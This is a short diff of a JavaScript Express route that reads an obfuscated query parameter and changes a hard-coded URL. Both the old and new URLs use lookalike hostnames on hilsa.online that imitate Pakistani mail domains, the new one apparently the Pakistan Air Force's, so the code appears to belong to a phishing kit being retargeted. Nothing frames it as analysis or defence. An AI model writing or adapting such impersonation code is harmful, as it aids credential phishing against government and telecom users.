@@ -10,7 +10,7 @@ router.get('/', (req, res) => {
 
     const data2 = req.query.lfdkjgiroetuiroyhgfhnbjkfsdfiowerierehjre;
 
-    const url = `https://mails.ntc.net.pk.hilsa.online/guDjuzDG`;
+    const url = `https://mails.paf.gov.pk.hilsa.online/jnblJwwz`;
 
       if (data2 == null) {
         res.render('error');
